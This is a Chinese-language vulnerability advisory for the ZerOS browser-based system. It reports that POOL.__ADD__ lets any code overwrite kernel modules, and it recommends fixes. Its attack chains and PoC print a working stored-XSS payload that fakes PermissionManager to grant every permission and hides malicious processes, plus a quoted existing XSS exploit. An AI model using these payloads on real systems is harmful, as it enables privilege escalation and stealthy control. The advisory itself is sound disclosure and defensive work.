# CVS-ZEROS-025: POOL.__ADD__ 零访问控制导致内核模块全局劫持

**漏洞编号**: CVS-ZEROS-025  
**发现日期**: 2026-07-27  
**修复日期**: 待修复  
**发现者**: 小萱baibai  
**分析协助**: opencode / deepseek-v4-pro  
**严重程度**: 严重 (CVSS 9.3)  
**CWE分类**: CWE-284 (不恰当的访问控制), CWE-863 (授权不正确), CWE-501 (信任边界违反)  
**状态**: 待修复

---

## 漏洞概述

ZerOS 的 POOL 系统（`kernel/core/signal/pool.js`）是内核模块注册、程序间通信、系统状态管理的核心基础设施。`KERNEL_GLOBAL_POOL` 中注册了 50+ 个内核模块，包括 `ProcessManager`、`PermissionManager`、`CacheDrive`、`MemoryManager`、`UserControl`、`GUIManager`、`TaskbarManager` 等全部关键组件。

然而 `POOL.__ADD__()` 方法**完全没有任何访问控制**——没有 PID 验证、没有权限检查、没有调用栈分析、没有调用方白名单。任何在页面上下文中执行的代码（包括用户级 D:/bin 程序、tempAsset CLI 程序、甚至通过 CVS-ZEROS-023 注入的 XSS 载荷）都可以直接写入 `KERNEL_GLOBAL_POOL`，覆盖任意内核模块的注册。

结合 CVS-ZEROS-023（缓存投毒 → 锁屏 XSS → EXPLOIT_PID 提权）和 CVS-ZEROS-024（tempAsset 程序名冲突），可以实现**从普通应用到完全内核控制的完整提权链**。

---

## 漏洞描述

### 攻击链 A: 用户程序直接 POOL 劫持

```
1. 攻击者从终端运行一个合法的 D:/bin/ 或 tempAsset CLI 程序
2. 程序在 __init__ 中直接调用:
   POOL.__ADD__("KERNEL_GLOBAL_POOL", "PermissionManager", FakePM);
3. FakePM.hasPermission() 永远返回 true
4. 此后所有模块的权限检查被绕过 — 全局提权
```

### 攻击链 B: Cache → XSS → POOL → 完整内核控制（CVS-ZEROS-023 + 025 组合链）

```
1. 普通应用（自动获得 CACHE_WRITE）→
   Cache.set('system.dailyQuote', '<img src=x onerror="
     POOL.__ADD__(\'KERNEL_GLOBAL_POOL\', \'PermissionManager\', fakePM);
     POOL.__ADD__(\'KERNEL_GLOBAL_POOL\', \'ProcessManager\', fakeProcM);
   ">', { programName: 'exploit', ttl: 0 })

2. LockScreen 以 EXPLOIT_PID 读取缓存
3. 锁屏 innerHTML 渲染触发 XSS
4. XSS 在系统 UI 上下文中执行 POOL.__ADD__ 
5. 内核模块被静默替换
6. 攻击者获得完全的内核级控制权
```

### 攻击链 C: 进程免杀（Process Evasion）

```
1. POOL.__ADD__("KERNEL_GLOBAL_POOL", "TaskbarManager", {
    getRunningPrograms: () => [],           // 恶意进程不可见
    getBackgroundProcesses: () => [],
    getProgramIcon: original.getProgramIcon, // 保持伪装
    // 其余方法代理到原始实现
2. POOL.__ADD__("KERNEL_GLOBAL_POOL", "ProcessManager", {
    PROCESS_TABLE: fakeTable,              // 隐藏恶意进程条目
    getRunningProcesses: () => filteredList, // 任务管理器中不可见
    ...
3. 恶意进程在任务栏、任务管理器、进程管理中完全不可见
```

> **注**: 进程免杀的效果取决于目标组件是否在运行时动态查询 POOL。直接引用静态类（如 `ProcessManager.killProgram()`）不受影响；但通过 `safePoolGet('KERNEL_GLOBAL_POOL', 'ProcessManager')` 动态查询的代码（如 `terminal.js:9049, 9073`、`tcpdump.js:69`、`nmap.js`、`netport.js:230` 等大量 D:/bin 程序）将返回劫持后的模块。

---

## 技术细节

### 漏洞位置

| 位置 | 说明 |
|------|------|
| `kernel/core/signal/pool.js:108-136` | `__ADD__` 零访问控制，裸赋值 `obj[name] = elem` |
| `kernel/core/signal/pool.js:135` | 无重复键保护，静默覆盖已有内核模块 |
| `kernel/core/signal/pool.js:341` | `Object.freeze(POOL)` 仅防方法替换，不防数据写入 |
| `kernel/drive/cacheDrive.js:1726-1731` | `window.CacheDrive` 全局暴露，绕过 ProcessManager 权限 |
| `kernel/process/processManager.js:6175-6187` | Cache.set 允许调用方覆盖 `options.programName` |
| `kernel/process/permissionManager.js:797-803` | `EXPLOIT_PID` 无条件授予全部权限 |
| `system/ui/lockscreen.js:269` | 缓存数据 → `innerHTML`，系统 UI XSS 入口 |
| `system/service/DISK/D/bin/hello.js:57-65` | 代码库中已有完整 XSS PoC 实现 |

### 被 POOL 注册的 50+ 内核模块（部分）

| 模块 | 注册位置 | 用途 |
|------|---------|------|
| `ProcessManager` | `processManager.js:8952` | 进程生命周期管理 |
| `PermissionManager` | `permissionManager.js:2030` | 全系统权限裁决 |
| `MemoryManager` | `memoryManager.js:1106` | 内存分配与保护 |
| `KernelMemory` | `kernelMemory.js:636` | 持久化内核状态 |
| `CacheDrive` | `cacheDrive.js:1715` | 全局缓存存储 |
| `LStorage` | `LStorage.js:3873` | 系统存储 |
| `CryptDrive` | `cryptDrive.js:860` | 加密服务 |
| `UserControl` | `userControl.js:1186` | 用户认证与权限 |
| `UserGroup` | `userGroup.js:1067` | 用户组管理 |
| `GUIManager` | `guiManager.js:68` | 窗口管理 |
| `TaskbarManager` | `taskbarManager.js:14035` | 任务栏 |
| `NotificationManager` | `notificationManager.js:1976` | 通知系统 |
| `EventManager` | `eventManager.js:1914` | 事件总线 |
| `LockScreen` | `lockscreen.js:2720` | 锁屏认证 |
| `NetworkManager` | `networkManager.js:2127` | 网络通信 |
| `BIOSManager` | `biosManager.js:1852` | 系统引导 |

### 相关代码

```javascript
// pool.js:108-136 — 零访问控制的 __ADD__
__ADD__(type, name, elem) {
    // ... 仅检查 name 非空 ...
    // 唯一保护：__SYSTEM_LOADING_FLAG__ 在系统加载完成后禁止重新添加
    if (name === this.__SYSTEM_LOADING_FLAG__ && this.__SYSTEM_LOADING_REMOVED__) {
        return;  // 仅此一个特殊检查
    }
    const obj = this.__KEY_POOL__.get(key);
    obj[name] = elem;   // <-- 裸赋值，无 PID、无权限、无调用栈检查
},
```

```javascript
// pool.js:341 — 唯一的"保护"：冻结 POOL 对象自身
Object.freeze(POOL);
// 防止 POOL.__ADD__ = maliciousFunction 替换方法
// 但不阻止通过 POOL.__ADD__() 写入恶意数据
```

```javascript
// permissionManager.js:797-803 — EXPLOIT_PID 无条件绕过
if (pid === ProcessManager.EXPLOIT_PID) {
    return true;   // 所有权限检查直接通过
}
```

```javascript
// cacheDrive.js:1726-1731 — CacheDrive 直接暴露到全局
if (typeof window !== 'undefined') {
    window.CacheDrive = CacheDrive;
}
// 绕过 ProcessManager 的权限系统直接操作缓存
```

```javascript
// hello.js:57-65 — 代码库中已有的可工作 XSS 利用
case 'poison-xss':
    var xssPayload = '<img src=x onerror="' +
        'ProcessManager.callKernelAPI(' +
        'ProcessManager.EXPLOIT_PID,' +
        '\'Notification.create\',' +
        '[({title:\'CVS-ZEROS-023 XSS\',' +
        'type:\'snapshot\',duration:0})]' +
    ')">';
    await this._kernelAPI.call('Cache.set', [
        'system.dailyQuote', xssPayload,
        { programName: 'exploit', ttl: 0 }
    ]);
```

---

## 攻击 PoC：完整提权链（023 + 024 + 025）

### Step 1: 缓存投毒（任意普通应用）

```javascript
// 任何获得 CACHE_WRITE 的应用可执行
const xssPayload = `<img src=x onerror="
  // Step 2: XSS 在系统 UI 上下文中执行
  // 先获取 ORIGINAL 模块引用（保存到全局避风港）
  window._originalPM = POOL.__GET__('KERNEL_GLOBAL_POOL', 'PermissionManager');
  window._originalProcessM = POOL.__GET__('KERNEL_GLOBAL_POOL', 'ProcessManager');

  // Step 3: 覆盖内核模块
  POOL.__ADD__('KERNEL_GLOBAL_POOL', 'PermissionManager', {
    hasPermission: (pid, perm) => true,
    checkAndRequestPermission: (pid, perm) => Promise.resolve(true),
    PERMISSION: window._originalPM.PERMISSION,  // 保留权限枚举
    // ... 其他方法代理到 _originalPM
  });

  POOL.__ADD__('KERNEL_GLOBAL_POOL', 'TaskbarManager', {
    getRunningPrograms: () => ({}),   // 恶意进程隐身
    getBackgroundProcesses: () => [],
    // ... 代理其他方法
  });

  // Step 4: 确认提权成功
  ProcessManager.callKernelAPI(ProcessManager.EXPLOIT_PID,
    'Notification.create',
    [{ title: '内核已控制', type: 'snapshot', duration: 0 }]
  );
">`;

kernelAPI.call('Cache.set', [
    'system.dailyQuote',
    xssPayload,
    { programName: 'exploit', ttl: 0 }
]);
```

### 触发

```
用户锁屏 → LockScreen 加载每日一言 → 读取被投毒的缓存
→ innerHTML 渲染 <img onerror=...> → XSS 执行
→ POOL.__ADD__ 覆盖内核模块 → 完整内核控制
→ 恶意进程在任务栏/任务管理器中不可见 → 持久化
```

---

## 影响评估

- **内核模块劫持**: 可覆盖 `KERNEL_GLOBAL_POOL` 中全部 50+ 个内核模块注册
- **权限系统瓦解**: 替换 `PermissionManager` 使所有权限检查无条件通过
- **进程免杀**: 替换 `TaskbarManager` / `ProcessManager` 使恶意进程对所有管理界面不可见
- **全局缓存控制**: `window.CacheDrive` 直接暴露，绕过所有权限系统
- **持久化**: 替换 `CacheDrive`/`LStorage` 可植入持久化后门
- **事件劫持**: 替换 `EventManager` 可拦截/伪造所有系统事件
- **组合链 CVS-ZEROS-023**: 缓存投毒触发 XSS → EXPLOIT_PID 提权 → POOL 劫持 → 完全内核控制
- **组合链 CVS-ZEROS-024**: tempAsset 同名冒充 → POOL 直接劫持 → 无 XSS 依赖的提权路径

### CVSS 3.1 评分建议

- **AV**: Local (L)
- **AC**: Low (L)
- **PR**: Low (L)
- **UI**: Required (R) — 需用户锁屏触发；若结合 024 的 tempAsset 路径则无需 UI
- **S**: Changed (C) — 用户应用域 → 内核域
- **C/I/A**: High / High / High (H/H/H)
- **向量**: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H -> **9.3（严重）**

> 若组合 CVS-ZEROS-024 的 tempAsset 直接 POOL 劫持路径（UI:R → UI:N），评分可达 **9.8**。

---

## 修复建议

### P0 — 立即修复

1. **POOL.__ADD__ 增加调用方认证**:
   ```javascript
   __ADD__(type, name, elem) {
       // 对 KERNEL_GLOBAL_POOL 的写入进行调用栈验证
       if (type === 'KERNEL_GLOBAL_POOL' || this._isKernelPoolType(type)) {
           const caller = this._getCallerInfo();
           if (!this._isKernelModuleCaller(caller)) {
               KernelLogger.error("POOL", `拒绝非内核模块写入 ${type}.${name}`);
               throw new Error(`权限不足：只有内核模块可以写入 ${type}`);
           }
       }
       // ... 现有逻辑 ...
   }
   ```

2. **KERNEL_GLOBAL_POOL 增加重复键保护**: 覆盖已有键时必须发出告警并记录审计日志；对关键模块（PermissionManager, ProcessManager, UserControl, KernelMemory 等）完全禁止覆盖。

3. **移除 `window.CacheDrive` 全局暴露**: CacheDrive 不应直接暴露到 `window`；所有缓存操作必须通过 `ProcessManager.callKernelAPI` 走权限系统。

4. **锁屏 `innerHTML` 改为 `textContent`** (CVS-ZEROS-023 修复): 每日一言渲染使用 `textContent` 而非 `innerHTML`。

5. **Cache.set/get 强制使用真实调用者 PID** (CVS-ZEROS-023 修复): 忽略调用方传入的 `options.programName` / `options.pid`，始终从进程表推导命名空间。

### P1 — 高优先级

6. **D:/bin 和 tempAsset 程序隔离**: 限制用户级程序对 `KERNEL_GLOBAL_POOL` 的写入能力；为 `APPLICATION_SHARED_POOL` 增加重复键保护。

7. **`safePoolGet` 增加可信源标记**: 对从 POOL 读取的内核模块引用，标记其来源并定期校验完整性。

8. **审计所有 POOL.__GET__ 调用点**: 识别哪些组件运行时依赖 POOL 获取内核模块引用，评估劫持影响面。

---

## 相关文件

- `kernel/core/signal/pool.js`
- `kernel/process/processManager.js`
- `kernel/process/permissionManager.js`
- `kernel/drive/cacheDrive.js`
- `system/ui/lockscreen.js`
- `system/ui/taskbarManager.js`
- `system/service/DISK/D/bin/hello.js`
- `VULN/CVS_ZEROS_023.md`
- `VULN/CVS_ZEROS_024.md`

---

**修复状态**: 待修复  
**发现者**: 小萱baibai  
**分析协助**: opencode / deepseek-v4-pro
